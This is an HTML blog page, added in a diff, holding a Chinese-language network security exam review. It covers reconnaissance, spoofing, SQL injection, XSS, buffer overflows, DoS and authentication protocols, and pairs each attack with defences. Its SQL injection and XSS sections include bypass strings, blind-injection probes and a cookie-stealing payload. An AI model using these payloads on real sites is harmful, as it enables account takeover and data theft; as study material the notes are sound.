@@ -1,0 +1,1287 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="概论CIA三元组 机密性 完整性 可用性  网络攻击类型安全属性分5类:阻断、截取、篡改、伪造、重放攻击 攻击方式:主动、被动攻击 OSI安全体系：5类安全服务:机密性、完整性、访问控制、不可否认、鉴别；   8种安全机制：访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密     第一章 攻击流程和渗透测试黑客攻击流程踩点：确定目标地址范围、查询名字空间、收集信息扫描：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全复习">
+<meta property="og:url" content="http://yoursite.com/2018/11/14/网络安全复习/index.html">
+<meta property="og:site_name" content="Jason&#39;s sky">
+<meta property="og:description" content="概论CIA三元组 机密性 完整性 可用性  网络攻击类型安全属性分5类:阻断、截取、篡改、伪造、重放攻击 攻击方式:主动、被动攻击 OSI安全体系：5类安全服务:机密性、完整性、访问控制、不可否认、鉴别；   8种安全机制：访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密     第一章 攻击流程和渗透测试黑客攻击流程踩点：确定目标地址范围、查询名字空间、收集信息扫描：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/Xmtwn9i.png">
+<meta property="og:image" content="https://i.imgur.com/22ig6XD.png">
+<meta property="og:image" content="https://i.imgur.com/B8PrS5a.png">
+<meta property="og:image" content="https://i.imgur.com/C8f4S3m.png">
+<meta property="og:image" content="https://i.imgur.com/dJouaKB.png">
+<meta property="og:image" content="https://i.imgur.com/G8bPgEX.png">
+<meta property="og:image" content="https://i.imgur.com/ZdSOJCX.png">
+<meta property="og:updated_time" content="2018-11-18T04:09:16.066Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网络安全复习">
+<meta name="twitter:description" content="概论CIA三元组 机密性 完整性 可用性  网络攻击类型安全属性分5类:阻断、截取、篡改、伪造、重放攻击 攻击方式:主动、被动攻击 OSI安全体系：5类安全服务:机密性、完整性、访问控制、不可否认、鉴别；   8种安全机制：访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密     第一章 攻击流程和渗透测试黑客攻击流程踩点：确定目标地址范围、查询名字空间、收集信息扫描：">
+<meta name="twitter:image" content="https://i.imgur.com/Xmtwn9i.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/14/网络安全复习/"/>
+
+
+
+
+
+  <title>网络安全复习 | Jason's sky</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jason's sky</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">everbodyup</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/14/网络安全复习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="王嘉熙">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jason's sky">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网络安全复习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-14T18:16:41+08:00">
+                2018-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/14/网络安全复习/" class="leancloud_visitors" data-flag-title="网络安全复习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,204
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><h2 id="CIA三元组"><a href="#CIA三元组" class="headerlink" title="CIA三元组"></a>CIA三元组</h2><ul>
+<li>机密性</li>
+<li>完整性</li>
+<li>可用性</li>
+</ul>
+<h2 id="网络攻击类型"><a href="#网络攻击类型" class="headerlink" title="网络攻击类型"></a>网络攻击类型</h2><h3 id="安全属性分5类"><a href="#安全属性分5类" class="headerlink" title="安全属性分5类:"></a>安全属性分5类:</h3><p>阻断、截取、篡改、伪造、重放攻击</p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h3><p>主动、被动攻击</p>
+<h2 id="OSI安全体系："><a href="#OSI安全体系：" class="headerlink" title="OSI安全体系："></a>OSI安全体系：</h2><h3 id="5类安全服务"><a href="#5类安全服务" class="headerlink" title="5类安全服务:"></a>5类安全服务:</h3><p>机密性、完整性、访问控制、不可否认、鉴别；  </p>
+<h3 id="8种安全机制："><a href="#8种安全机制：" class="headerlink" title="8种安全机制："></a>8种安全机制：</h3><p>访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密   </p>
+<hr>
+<h1 id="第一章-攻击流程和渗透测试"><a href="#第一章-攻击流程和渗透测试" class="headerlink" title="第一章 攻击流程和渗透测试"></a>第一章 攻击流程和渗透测试</h1><h2 id="黑客攻击流程"><a href="#黑客攻击流程" class="headerlink" title="黑客攻击流程"></a>黑客攻击流程</h2><p><img src="https://i.imgur.com/Xmtwn9i.png" alt=""><br>踩点：确定目标地址范围、查询名字空间、收集信息<br>扫描：评估目标系统，识别监听业务<br>查点：识别目标系统上合法用户账户和保护力不够的共享资源<br>获取访问权：利用收集的足够数据，访问目标系统<br>提权：寻找系统完全控制<br>窃取信息:通过信息获取确定目标系统的入侵机制和途径<br>掩踪灭迹:擦除访问痕迹<br>创建后门：系统中留下后门和陷阱，为下次入侵创造条件<br>拒绝服务:无法取得特权，使用漏洞代码使目标系统瘫痪  </p>
+<h2 id="搜索引擎技巧"><a href="#搜索引擎技巧" class="headerlink" title="搜索引擎技巧:"></a>搜索引擎技巧:</h2><ul>
+<li>site: 具体网站  </li>
+<li>link:链接到URL网页  </li>
+<li>inurr:包含第一个关键词,其他在链接或网页文档  </li>
+<li>allinurl:链接包含查询关键词  </li>
+<li>allintitle&amp;intitle类似上   </li>
+<li>related、cache、info等   </li>
+</ul>
+<h2 id="渗透测试七个阶段："><a href="#渗透测试七个阶段：" class="headerlink" title="渗透测试七个阶段："></a>渗透测试七个阶段：</h2><ul>
+<li>前期交互 </li>
+<li>情报搜集</li>
+<li>威胁建模 </li>
+<li>漏洞分析</li>
+<li>渗透攻击</li>
+<li>后渗透攻击</li>
+<li>报告</li>
+</ul>
+<h2 id="踩点途径"><a href="#踩点途径" class="headerlink" title="踩点途径"></a>踩点途径</h2><p>1.WHOIS查询：获得域名和IP地址注册信息<br>2.DNS查询：</p>
+<ul>
+<li>工具作用：</li>
+</ul>
+<p>nslookup(查询域名信息或诊断DNS服务器问题)、dig(域名解析)、fierce(暴力破解DNS)</p>
+<ul>
+<li>命令作用：</li>
+</ul>
+<p>host:主机名<->网际地址<br>traceroute:路由追踪</-></p>
+<p>3.公开渠道获取信息<br>4.网络侦查   </p>
+<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>基本步骤：  </p>
+<p>确定目标系统是否真实存在-&gt;确定目标系统上那些服务正在运行或监听-&gt;探查操作系统  </p>
+<p>nmap:<br>ping:发送ICMP ECHO包(nmap -sP)<br><code>nmap -sT(TCP)/nmap -sS(SYN)/nmap -sF(FIN).nmap -sX.namp -sN/namp -sA(ACK)/nmap -sW(窗口)/nmap -sM(Maimon)/nmap -sU(UDP)</code></p>
+<p>Nessus/OpenVAS:<br>主机扫描/端口扫描/OS识别/漏洞扫描</p>
+<h2 id="查点"><a href="#查点" class="headerlink" title="查点"></a>查点</h2><h3 id="旗标抓取"><a href="#旗标抓取" class="headerlink" title="旗标抓取"></a>旗标抓取</h3><p>telnet<br><code>telnet www.cumt.edu.cn 80</code><br>netcat<br><code>nc -v 163.com 80</code></p>
+<h1 id="第二章网络嗅探"><a href="#第二章网络嗅探" class="headerlink" title="第二章网络嗅探"></a>第二章网络嗅探</h1><ul>
+<li>共享式局域网</li>
+<li>交换式局域网（溢出攻击、ARP欺骗）</li>
+</ul>
+<p>嗅探软件工作机制:</p>
+<ul>
+<li>驱动程序支持</li>
+<li>分组捕获过滤机制</li>
+</ul>
+<p>网卡工作模式：</p>
+<ul>
+<li>广播:广播信息</li>
+<li>组播:组播数据</li>
+<li>单播：目的地址匹配本机MAC地址数据帧</li>
+<li>混杂：接收一切数据帧</li>
+</ul>
+<p>Winpcap基于混杂模式进行嗅探</p>
+<h1 id="第三章口令破解与防御"><a href="#第三章口令破解与防御" class="headerlink" title="第三章口令破解与防御"></a>第三章口令破解与防御</h1><p>Windows:<br>安全账户管理器SAM机制（%systemroot%system32\config）<br>SAM:<br>包含本地系统所有用户名和口令的Hash值<br>口令Hash:<br>LM和NTLMv2<br>hash密码格式:<br>用户名:RID:LM-HASH值：NT-HASH值   </p>
+<p><strong>Linux</strong>:<br>修改密码:passwd<br>/etc/passwd：用户名及基本信息<br>/etc/shadow：加密过的密码及失效时间<br>/etc/group:所有组<br>/etc/gshadow:所有组的群组影子密码文件<br>过去:crypt() 现在：crypt16() 口令+salt=不同加密口令（md5）  </p>
+<h2 id="命令功能及使用"><a href="#命令功能及使用" class="headerlink" title="命令功能及使用"></a>命令功能及使用</h2><ul>
+<li>chmod:修改文件权限位  </li>
+<li>passwd/gpasswd 密码修改  </li>
+<li>usermod/groupmod 用户账户修改   </li>
+</ul>
+<h1 id="第四章欺骗技术与防御"><a href="#第四章欺骗技术与防御" class="headerlink" title="第四章欺骗技术与防御"></a>第四章欺骗技术与防御</h1><h2 id="0x01-IP欺骗"><a href="#0x01-IP欺骗" class="headerlink" title="0x01 IP欺骗"></a>0x01 IP欺骗</h2><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>IP协议:非面向连接，连接依靠双方IP地址</p>
+<p>IP欺骗的方式：<br>简单的IP地址更改、源路由攻击、TCP会话劫持。</p>
+<p>TCP会话劫持：接管现存动态会话的过程。即攻击者替代原来的合法用户，同时监视并掌握会话内容</p>
+<p>劫持过程</p>
+<ul>
+<li>发现攻击目标</li>
+<li>确认动态会话</li>
+<li>猜测序列号</li>
+<li>使客户主机下线</li>
+<li>接管会话<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3>1.防范基本的IP欺骗</li>
+<li>入口过滤：不允许外网的数据包使用单位内部地址作为源地址</li>
+<li>出口过滤：内网到内网主机的流量不允许流出</li>
+</ul>
+<p>2.防范源路由欺骗<br>设置路由器禁用源路由</p>
+<p>3.防范会话劫持<br>加密、安全协议(SSH而非Telnet)、限制保护</p>
+<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ol>
+<li>工作原理: IP地址=&gt;MAC地址（广播）  </li>
+<li>ARP协议有ARP请求包和ARP应答包</li>
+<li>主机和网关都有ARP缓存表，就是IP-MAC地址对，分静态和动态。(arp -a可进行查看)</li>
+<li>ARP欺骗原理（中间人）：</li>
+</ol>
+<p><img src="https://i.imgur.com/22ig6XD.png" alt=""></p>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>MAC地址绑定</li>
+<li>静态ARP缓存</li>
+<li>ARP服务器</li>
+<li>ARP欺骗防护软件(ARP防火墙)</li>
+<li>隔离进行ARP欺骗的主机<br>arp记录设置成静态:<code>arp -s ip mac</code><h1 id="第五章Web欺骗与防御"><a href="#第五章Web欺骗与防御" class="headerlink" title="第五章Web欺骗与防御"></a>第五章Web欺骗与防御</h1></li>
+</ul>
+<h2 id="SQL注入攻击原理"><a href="#SQL注入攻击原理" class="headerlink" title="SQL注入攻击原理"></a>SQL注入攻击原理</h2><ol>
+<li><p>利用Web应用对后台数据库查询语句处理存在的安全漏洞，提交一段精心构造的数据库查询代码，根据返回结果获取数据。（输入参数不检查和过滤的系统）</p>
+</li>
+<li><p>注入方法:<br>布尔型、时间延迟、报错型、可联合查询、多语句查询注入等</p>
+</li>
+<li><p>GET:提交信息显示在URL</p>
+</li>
+<li>POST:不显示</li>
+<li>注入过程<br>假设查询语句<br><code>select * from users where userID=&#39;$name&#39; and userPasswd=&#39;$passwd&#39;</code></li>
+</ol>
+<p>可闭合单引号进行绕过</p>
+<p><code>admin/1234567&#39; or &#39;1&#39;=&#39;1</code>或<code>admin/1234567&#39; or 1=1#</code></p>
+<h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><p>复习盲注:<br>1.测试漏洞</p>
+<pre><code>and 1=2,and 1=1;
+</code></pre><p>2.猜字段</p>
+<pre><code>and exists(select * from admin);
+and exists(select id from admim);
+and exists(select username from admin);
+and exists(select passwd from admin);
+</code></pre><p>3.猜用户名和长度</p>
+<pre><code>and exists(select id from admin where id=1);
+and exists(select id from admin where len(username)=5 and id=1);
+and exists(select id from admin where len(passwd)=10 and id=1)
+</code></pre><p>4.猜测用户名</p>
+<pre><code>and 1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;100)
+1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;50)
+</code></pre><p>折半查找<br>    当&lt;变=可确定ascii对应的字符<br>    and 1=(select id from (select * from admin where id=1) where username=’admin’;</p>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>使用预编译语句，绑定变量</li>
+<li>用户提交的数据和输入参数进行严格过滤(,’;select delete from union 等)</li>
+<li>摒弃动态SQL语句，改用存储过程来访问和操作数据</li>
+<li>使用安全函数:OWASP、ESAPI</li>
+<li>最小权限原则</li>
+</ol>
+<p>##XSS<br>分类</p>
+<ul>
+<li>反射型XSS：需要主动点击</li>
+<li>存储式XSS：脚本永久存储目标服务器数据库或文件</li>
+<li>DOM型XSS：客户端浏览器对请求页面进行DOM渲染(不需要服务器解析响应，浏览器DOM解析触发)</li>
+</ul>
+<p>举例：</p>
+<pre><code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;link&lt;/a&gt;
+构造 &#39;onclick=alert(&quot;xss&quot;)//
+构造 &#39;&gt;&lt;img src=# onerror=alert(&quot;xss&quot;)/&gt;&lt;&#39;
+</code></pre><p>发起条件：</p>
+<ul>
+<li>Web服务器允许用户在表格或编辑框中输入不相关<br>的字符</li>
+<li>Web服务器存储并允许把用户输入显示在返回给终<br>端用户的页面上，而没有去除非法字符或者重新进</li>
+</ul>
+<p>跨站脚本攻击的两个条件：</p>
+<ul>
+<li>存在跨站脚本漏洞的web应用程序</li>
+<li>用户点击连接或者访问某一页面</li>
+</ul>
+<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><pre><code>&lt;a href&gt;=&quot;http://www.baidu.com&quot;&gt;baidu&lt;/A&gt;
+&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;
+</code></pre><p>cookie发送远程代码<br><code>javascript: window.location=&#39;link?&#39;+document.cookie</code></p>
+<p>论坛管理员修改权限操作<br><code>admin_user.asp?&amp;username=xxx&amp;membercode=yyy</code><br>先获取管理员权限后构造<br><code>&lt;img src=window.location=&#39;http://127.0.0.1/admin_user.asp?&amp;username=xxx&amp;membercode=yyy&#39;&gt;</code></p>
+<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>对用户来说，教育为主。<br>注意可疑链接，可装入一些浏览器插件如Firefox的NoScript</li>
+<li>Web应用开发者</li>
+</ol>
+<ul>
+<li>对所有用户提交内容进行可靠的输入验证(URL、POST数据)</li>
+<li>保护所有敏感的功能，以防被机器人自动执行或被第三方网站执行。(session标记、验证码)</li>
+</ul>
+<p>其他Web攻击类型：<br>CSRF、失效的身份认证和会话管理、不安全对象的直接引用、安全配置错误、敏感信息泄露、</p>
+<h1 id="第六章缓冲区溢出漏洞"><a href="#第六章缓冲区溢出漏洞" class="headerlink" title="第六章缓冲区溢出漏洞"></a>第六章缓冲区溢出漏洞</h1><h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><p>程序在内存存放形式：一段连续的内存块，包括代码段、数据段和堆栈段。</p>
+<ul>
+<li>代码段(.text)：程序的机器码和只读数据，只读。</li>
+<li>数据段:已初始化(.data)和未初始化(.bss),编译时分配</li>
+<li>堆栈段：堆(Heap)+栈(Stack)<br>堆：大小不固定，可动态扩张/缩减。堆内存释放由应用程序控制。<br>栈：运行时按需分配，先进后出。PUSH压栈，POP出栈。</li>
+</ul>
+<p>堆栈区别：</p>
+<ul>
+<li>分配和管理方式不同</li>
+<li>产生碎片不同</li>
+<li>生长方向不同</li>
+</ul>
+<ol>
+<li>file offset:数据在PE文件中相对文件开头的偏移</li>
+<li>Image Base:PE文件装入虚拟内存基地址</li>
+<li>VA:PE文件指令被装入虚拟内存后的地址</li>
+<li>RVA：VA相对于基址的偏移量</li>
+<li>VA=Image Base + RVA</li>
+</ol>
+<p><code>file offset = RVA - section offset= VA - Image base - section offset</code></p>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出:"></a>栈溢出:</h2><p>ESP(extended stack pointer)：系统栈最上面栈帧的栈顶<br>EBP：系统栈最上面栈帧的栈底<br>EIP：指向下一条等待执行的指令地址</p>
+<p>函数调用参数入栈顺序：<br>VC —_cdecl方式(由右至左) </p>
+<p>函数入栈步骤：<br>参数入栈、返回地址入栈、代码区跳转、栈帧调整。</p>
+<p>调用指令：</p>
+<pre><code>push 参数2
+push 参数1
+call 函数地址(保存返回地址；跳转到调用函数入口)
+push ebp;
+move ebp,esp
+sub esp,xxx 分配XXX字节栈区空间
+</code></pre><h2 id="缓冲区溢出攻击的基本类型："><a href="#缓冲区溢出攻击的基本类型：" class="headerlink" title="缓冲区溢出攻击的基本类型："></a>缓冲区溢出攻击的基本类型：</h2><ul>
+<li>栈溢出</li>
+<li>堆溢出</li>
+<li>BSS溢出</li>
+<li>格式化串溢出</li>
+<li>整数溢出</li>
+</ul>
+<h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>避免源码中的相关bug（）</li>
+<li>插入代码进行数组边界检查、 返回指针完整性检查</li>
+<li>阻止攻击代码执行(非执行缓冲区技术、堆栈数据段不可执行)</li>
+<li>加强系统防护（GS机制、SafeSEH、DEP）</li>
+</ol>
+<h1 id="第七章拒绝服务"><a href="#第七章拒绝服务" class="headerlink" title="第七章拒绝服务"></a>第七章拒绝服务</h1><h2 id="0x01-DOS攻击"><a href="#0x01-DOS攻击" class="headerlink" title="0x01 DOS攻击"></a>0x01 DOS攻击</h2><ol>
+<li>概念：破坏性攻击，通过消耗可用系统资源、带宽资源或造成程序缓冲区溢出错误，致使系统无法正常服务。</li>
+<li>类型:网络带宽攻击、连通性攻击、滥用合理的服务请求、利用传输协议缺陷、利用服务程序的漏洞</li>
+</ol>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>1.Ping of Death</p>
+<p>缓存溢出： ping -l 65540 192.168.1.140</p>
+<p>2.泪滴（Teardrop）</p>
+<p>分片攻击，数据分片后传送到目标主机后再到堆栈中进行重组。</p>
+<p>3.泛洪类（Flood）<br>UDP泛洪： 利用主机自动回复的服务(echo、chargen),一方的输出成为另一方的输入。</p>
+<pre><code>SYN泛洪：利用TCP协议缺陷，发送大量伪造的TCP连接请求。
+ACK泛洪
+Connection泛洪
+HTTP Get 泛洪
+</code></pre><p>4.Land攻击(源地址和目标地址相同)<br>5.Smurf攻击(源为攻击主机地址，目的为广播地址，ICMP )<br>6.Fraggle攻击(Smurf区别为UDP)<br>7.畸形消息攻击<br>8.Slashdot effect<br>9.WinNuke攻击（攻击目标端口）  </p>
+<h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p>SYN防御：缩短SYN Timeout时间、设置SYN Cookie、负反馈策略、退让策略、退让策略、 防火墙</p>
+<p>拒绝服务攻击的防御困难之处——不容易定位攻击者。</p>
+<p>防御方法： 有效完善的设计、带宽限制、及时给系统安装补丁、运行尽可能少的服务、只允许必要的通信、封锁敌意IP地址</p>
+<h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>DDOS原理：通过控制分布在网络各处的数百甚至数万台傀儡主机（肉机），<br>发动它们同时向攻击目标进行DoS攻击。</p>
+<h1 id="第八章身份认证"><a href="#第八章身份认证" class="headerlink" title="第八章身份认证"></a>第八章身份认证</h1><h2 id="AAA"><a href="#AAA" class="headerlink" title="AAA"></a>AAA</h2><ul>
+<li>认证</li>
+<li>授权</li>
+<li>审计记账</li>
+</ul>
+<h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><ul>
+<li>简单口令认证</li>
+<li>基于单向函数的口令认证</li>
+</ul>
+<ul>
+<li>一次性口令认证<br>防止重放攻击；基于客户端/服务器模式；</li>
+</ul>
+<ol>
+<li>连接请求</li>
+<li>返回seed,seq(服务器seq-1)</li>
+<li>输入口令，口令+seed做seq次hash；</li>
+<li>服务器存储用户上次登录得一次性口令，hash依次比较，一致通过，覆盖口令</li>
+</ol>
+<h2 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h2><p>基于对称加密技术，集中的身份认证和密钥分配。</p>
+<p>3个子协议</p>
+<ol>
+<li>认证服务器交换（AS 交换）</li>
+<li>票证授予服务器交换（TGS 交换）</li>
+<li>客户/ 服务器认证应用交换（AP 交换）</li>
+</ol>
+<p><img src="https://i.imgur.com/B8PrS5a.png" alt=""></p>
+<h1 id="第九章VPN"><a href="#第九章VPN" class="headerlink" title="第九章VPN"></a>第九章VPN</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>VPN是在公共网络上传输私有通信的方法。VPN通常使用（加密的）隧道将两个或多个专用网络连接起来。</p>
+<h2 id="层次和类型"><a href="#层次和类型" class="headerlink" title="层次和类型"></a>层次和类型</h2><p><img src="https://i.imgur.com/C8f4S3m.png" alt=""></p>
+<h2 id="隧道协议"><a href="#隧道协议" class="headerlink" title="隧道协议"></a>隧道协议</h2><p><img src="https://i.imgur.com/dJouaKB.png" alt=""><br><img src="https://i.imgur.com/G8bPgEX.png" alt=""></p>
+<h2 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h2><p>概念：用于构建VPN的一系列协议。为提供加密安全服务而开发，支持认证、完整性、访问控制以及数据一致性。只允许IP数据的封装和加密。</p>
+<p>组成：</p>
+<ul>
+<li>Internet密钥交换协议（IKE）</li>
+<li>封装协议<ol>
+<li>负载安全封装</li>
+<li>认证报头协议<br><img src="https://i.imgur.com/ZdSOJCX.png" alt=""></li>
+</ol>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="王嘉熙 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="王嘉熙 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/13/南邮/" rel="next" title="南邮CTF">
+                <i class="fa fa-chevron-left"></i> 南邮CTF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
